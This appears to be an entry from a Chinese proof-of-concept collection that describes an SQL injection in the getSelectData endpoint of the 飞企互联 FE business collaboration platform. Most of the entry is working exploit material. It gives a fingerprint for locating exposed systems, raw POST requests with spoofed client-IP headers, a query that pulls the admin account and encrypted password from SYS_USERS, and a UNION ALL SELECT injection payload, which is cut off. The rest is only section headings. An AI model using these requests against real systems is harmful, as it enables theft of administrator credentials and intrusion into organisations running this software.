# 飞企互联FE业务协作平台getSelectData存在SQL注入漏洞

- **系统**：飞企互联FE业务协作平台　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name=="飞企互联 FE 6.0+"`
- **请求**：`POST /oaerp/ui/common/publicData.js%70 HTTP/1.1`

**请求体 / payload**
```
通过如下poc可查询管理员账号及加密密码
Host: {hostname}
Content-Length: 49
Content-Type: application/x-www-form-urlencoded
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-IP: 127.0.0.1
type=getSelectData&table=SYS_USERS&filter=SU01%3D%27admin%27
POST /oaerp/ui/common/publicData.js%70 HTTP/1.1
Host: {hostname}
Content-Length: 49
Content-Type: application/x-www-form-urlencoded
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-IP: 127.0.0.1
type=getSelectData&table=SYS_USERS&filter=SU01='admin'+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNUL…（脚本共 2125 字，完整版见原文）
```

**其他**
- 飞企互联FE业务协作平台getSelectData存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 飞企互联FE业务协作平台